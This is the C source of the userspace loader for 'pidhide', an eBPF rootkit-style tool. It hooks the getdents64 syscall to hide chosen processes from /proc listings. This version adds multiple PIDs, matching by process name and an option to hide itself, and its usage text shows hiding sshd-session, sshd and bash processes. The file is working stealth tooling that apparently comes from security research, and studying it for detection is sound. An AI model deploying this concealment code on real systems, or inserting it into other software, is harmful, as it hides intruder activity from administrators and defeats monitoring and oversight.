// SPDX-License-Identifier: (LGPL-2.1 OR BSD-2-Clause)
/* Copyright (c) 2024 Crowdstrike */
/* Modified to support multiple PIDs and process name resolution */
#include <argp.h>
#include <signal.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>
#include <unistd.h>
#include <dirent.h>
#include <ctype.h>
#include <sys/resource.h>
#include <bpf/libbpf.h>
#include "common.h"
#include "common_um.h"
#include "pidhide.skel.h"

#define MAX_PIDS_TO_HIDE 16
#define MAX_PID_LEN 10
#define MAX_PROC_NAMES 8
#define MAX_PROC_NAME_LEN 64

// Setup Argument stuff
static struct env {
    int pids_to_hide[MAX_PIDS_TO_HIDE];
    int num_pids;
    char proc_names[MAX_PROC_NAMES][MAX_PROC_NAME_LEN];
    int num_proc_names;
    int target_ppid;
    int hide_self;  // Flag to hide pidhide itself
} env;

const char *argp_program_version = "pidhide 2.0 (multi-pid)";
const char *argp_program_bug_address = "<path@tofile.dev>";
const char argp_program_doc[] =
"PID Hider (Multi-PID Version)\n"
"\n"
"Uses eBPF to hide processes from usermode processes\n"
"By hooking the getdents64 syscall and unlinking the pid folder\n"
"\n"
"USAGE:\n"
"  ./pidhide -p 2222 -p 3333              # Hide specific PIDs\n"
"  ./pidhide -n sshd-session              # Hide all processes with this name\n"
"  ./pidhide -n sshd-session -p 1234      # Mix both methods\n"
"  ./pidhide -n sshd -n bash [-t 1111]    # Multiple process names\n"
"  ./pidhide -n sshd-session -s           # Also hide pidhide itself\n"
"\n"
"Process names are matched against /proc/<pid>/comm\n"
"You can specify up to 16 PIDs total (combined from -p and -n flags).\n"
"Use -s to also hide the pidhide process itself.\n"
"If nothing specified, defaults to hiding this program's PID.\n";

static const struct argp_option opts[] = {
    { "pid-to-hide", 'p', "PID", 0, "Process ID to hide (can specify multiple)" },
    { "name", 'n', "NAME", 0, "Process name to hide - resolves to all matching PIDs (can specify multiple)" },
    { "target-ppid", 't', "TARGET-PPID", 0, "Optional Parent PID, will only affect its children." },
    { "hide-self", 's', NULL, 0, "Also hide this pidhide process itself" },
    {},
};

static error_t parse_arg(int key, char *arg, struct argp_state *state)
{
    switch (key) {
    case 'p':
        if (env.num_pids >= MAX_PIDS_TO_HIDE) {
            fprintf(stderr, "Error: Maximum of %d PIDs can be hidden\n", MAX_PIDS_TO_HIDE);
            argp_usage(state);
        }
        errno = 0;
        int pid = strtol(arg, NULL, 10);
        if (errno || pid <= 0) {
            fprintf(stderr, "Invalid pid: %s\n", arg);
            argp_usage(state);
        }
        env.pids_to_hide[env.num_pids++] = pid;
        break;
    case 'n':
        if (env.num_proc_names >= MAX_PROC_NAMES) {
            fprintf(stderr, "Error: Maximum of %d process names can be specified\n", MAX_PROC_NAMES);
            argp_usage(state);
        }
        if (strlen(arg) >= MAX_PROC_NAME_LEN) {
            fprintf(stderr, "Error: Process name too long (max %d chars): %s\n", MAX_PROC_NAME_LEN - 1, arg);
            argp_usage(state);
        }
        strncpy(env.proc_names[env.num_proc_names], arg, MAX_PROC_NAME_LEN - 1);
        env.proc_names[env.num_proc_names][MAX_PROC_NAME_LEN - 1] = '\0';
        env.num_proc_names++;
        break;
    case 't':
        errno = 0;
        env.target_ppid = strtol(arg, NULL, 10);
        if (errno || env.target_ppid <= 0) {
            fprintf(stderr, "Invalid pid: %s\n", arg);
            argp_usage(state);
        }
        break;
    case 's':
        env.hide_self = 1;
        break;
    case ARGP_KEY_ARG:
        argp_usage(state);
        break;
    default:
        return ARGP_ERR_UNKNOWN;
    }
    return 0;
}

static const struct argp argp = {
    .options = opts,
    .parser = parse_arg,
    .doc = argp_program_doc,
};

/*
 * Resolve process name to PIDs by scanning /proc/<pid>/comm
 * Returns number of PIDs found and added to env.pids_to_hide
 */
static int resolve_pids_by_name(const char *proc_name)
{
    DIR *proc_dir;
    struct dirent *entry;
    char comm_path[64];
    char comm_buf[MAX_PROC_NAME_LEN];
    FILE *fp;
    int found = 0;
    int my_pid = getpid();

    proc_dir = opendir("/proc");
    if (!proc_dir) {
        perror("Failed to open /proc");
        return 0;
    }

    while ((entry = readdir(proc_dir)) != NULL) {
        // Skip non-numeric entries (not PIDs)
        if (!isdigit(entry->d_name[0]))
            continue;

        int pid = atoi(entry->d_name);
        if (pid <= 0)
            continue;

        // Don't hide ourselves
        if (pid == my_pid)
            continue;

        // Check if we've hit the limit
        if (env.num_pids >= MAX_PIDS_TO_HIDE) {
            fprintf(stderr, "Warning: Hit max PID limit (%d), some processes may not be hidden\n", 
                    MAX_PIDS_TO_HIDE);
            break;
        }

        // Read /proc/<pid>/comm
        snprintf(comm_path, sizeof(comm_path), "/proc/%d/comm", pid);
        fp = fopen(comm_path, "r");
        if (!fp)
            continue;  // Process might have died

        if (fgets(comm_buf, sizeof(comm_buf), fp) != NULL) {
            // Remove trailing newline
            size_t len = strlen(comm_buf);
            if (len > 0 && comm_buf[len - 1] == '\n')
                comm_buf[len - 1] = '\0';

            // Compare with target name
            if (strcmp(comm_buf, proc_name) == 0) {
                // Check if PID already in list (avoid duplicates)
                int duplicate = 0;
                for (int i = 0; i < env.num_pids; i++) {
                    if (env.pids_to_hide[i] == pid) {
                        duplicate = 1;
                        break;
                    }
                }
                if (!duplicate) {
                    env.pids_to_hide[env.num_pids++] = pid;
                    found++;
                }
            }
        }
        fclose(fp);
    }

    closedir(proc_dir);
    return found;
}

static int handle_event(void *ctx, void *data, size_t data_sz)
{
    const struct event *e = data;
    if (e->success)
        printf("Hid PID from program %d (%s)\n", e->pid, e->comm);
    else
        printf("Failed to hide PID from program %d (%s)\n", e->pid, e->comm);
    return 0;
}

int main(int argc, char **argv)
{
    struct ring_buffer *rb = NULL;
    struct pidhide_bpf *skel;
    int err;

    // Initialize env
    memset(&env, 0, sizeof(env));

    /* Parse command line arguments */
    err = argp_parse(&argp, argc, argv, 0, NULL, NULL);
    if (err)
        return err;

    /* Setup common tasks */
    if (!setup()) {
        fprintf(stderr, "Failed to do common setup\n");
        return 1;
    }

    /* Resolve process names to PIDs */
    for (int i = 0; i < env.num_proc_names; i++) {
        int found = resolve_pids_by_name(env.proc_names[i]);
        if (found == 0) {
            fprintf(stderr, "Warning: No processes found with name '%s'\n", env.proc_names[i]);
        } else {
            printf("Resolved '%s' to %d PID(s)\n", env.proc_names[i], found);
        }
    }

    /* Add our own PID if -s flag was given */
    if (env.hide_self) {
        int my_pid = getpid();
        if (env.num_pids < MAX_PIDS_TO_HIDE) {
            // Check for duplicate
            int duplicate = 0;
            for (int i = 0; i < env.num_pids; i++) {
                if (env.pids_to_hide[i] == my_pid) {
                    duplicate = 1;
                    break;
                }
            }
            if (!duplicate) {
                env.pids_to_hide[env.num_pids++] = my_pid;
                printf("Adding self (PID %d) to hide list\n", my_pid);
            }
        } else {
            fprintf(stderr, "Warning: Cannot hide self, PID limit reached\n");
        }
    }

    /* If no PIDs specified (neither -p nor -n), default to our own PID */
    if (env.num_pids == 0) {
        env.pids_to_hide[0] = getpid();
        env.num_pids = 1;
        printf("No PIDs specified, defaulting to hiding self (PID %d)\n", env.pids_to_hide[0]);
    }

    /* Sanity check */
    if (env.num_pids == 0) {
        fprintf(stderr, "Error: No PIDs to hide\n");
        return 1;
    }

    /* Load and verify BPF application */
    skel = pidhide_bpf__open();
    if (!skel) {
        fprintf(stderr, "Failed to open and load BPF skeleton\n");
        return 1;
    }

    /* Set up the PIDs to hide in rodata */
    skel->rodata->num_pids_to_hide = env.num_pids;
    skel->rodata->target_ppid = env.target_ppid;

    for (int i = 0; i < env.num_pids; i++) {
        char pid_str[MAX_PID_LEN];
        int len = snprintf(pid_str, sizeof(pid_str), "%d", env.pids_to_hide[i]);
        
        // Copy the PID string (including null terminator for comparison)
        memcpy((void *)skel->rodata->pids_to_hide[i], pid_str, len + 1);
        skel->rodata->pid_lens[i] = len + 1;
    }

    /* Load & verify BPF programs */
    err = pidhide_bpf__load(skel);
    if (err) {
        fprintf(stderr, "Failed to load and verify BPF skeleton\n");
        goto cleanup;
    }

    /* Setup Maps for tail calls */
    int index = PROG_01;
    int prog_fd = bpf_program__fd(skel->progs.handle_getdents_exit);
    int ret = bpf_map__update_elem(
        skel->maps.map_prog_array,
        &index,
        sizeof(index),
        &prog_fd,
        sizeof(prog_fd),
        BPF_ANY);
    if (ret == -1) {
        printf("Failed to add program to prog array! %s\n", strerror(errno));
        goto cleanup;
    }
    
    index = PROG_02;
    prog_fd = bpf_program__fd(skel->progs.handle_getdents_patch);
    ret = bpf_map__update_elem(
        skel->maps.map_prog_array,
        &index,
        sizeof(index),
        &prog_fd,
        sizeof(prog_fd),
        BPF_ANY);
    if (ret == -1) {
        printf("Failed to add program to prog array! %s\n", strerror(errno));
        goto cleanup;
    }

    /* Attach tracepoints */
    err = pidhide_bpf__attach(skel);
    if (err) {
        fprintf(stderr, "Failed to attach BPF skeleton\n");
        goto cleanup;
    }

    /* Set up ring buffer polling */
    rb = ring_buffer__new(bpf_map__fd(skel->maps.rb), handle_event, NULL, NULL);
    if (!rb) {
        err = -1;
        fprintf(stderr, "Failed to create ring buffer\n");
        goto cleanup;
    }

    /* Process events */
    printf("Successfully started!\n");
    printf("Hiding %d PID(s):", env.num_pids);
    for (int i = 0; i < env.num_pids; i++) {
        printf(" %d", env.pids_to_hide[i]);
    }
    printf("\n");
    
    while (!exiting) {
        err = ring_buffer__poll(rb, 100 /* timeout, ms */);
        /* Ctrl-C will cause -EINTR */
        if (err == -EINTR) {
            err = 0;
            break;
        }
        if (err < 0) {
            printf("Error polling perf buffer: %d\n", err);
            break;
        }
    }

cleanup:
    /* Clean up */
    ring_buffer__free(rb);
    pidhide_bpf__destroy(skel);

    return err < 0 ? -err : 0;
}